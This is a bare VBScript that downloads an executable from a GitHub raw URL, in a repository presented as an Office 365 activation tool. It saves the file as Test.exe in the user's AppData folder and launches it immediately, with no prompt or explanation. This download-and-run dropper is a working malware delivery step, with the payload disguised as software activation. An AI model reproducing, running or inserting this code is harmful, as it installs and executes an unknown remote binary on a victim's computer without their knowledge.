WScript.Sleep  1000

path = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%APPDATA%")
path = path & "\"
URL = "https://raw.githubusercontent.com/Black-Code01/Office-365ProPlus-Activation/refs/heads/main/Microsoft%20Office%20365.exe"
filename = "Test.exe" 
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", URL, False
xHttp.Send

with bStrm
    .type = 1 '//binary
    .open
    .write xHttp.responseBody
    .savetofile path &  filename, 2 '//overwrite
end with

file = path & filename
Set WshShell = WScript.CreateObject("WScript.Shell")
WshShell.Run  chr(34) & file & chr(34)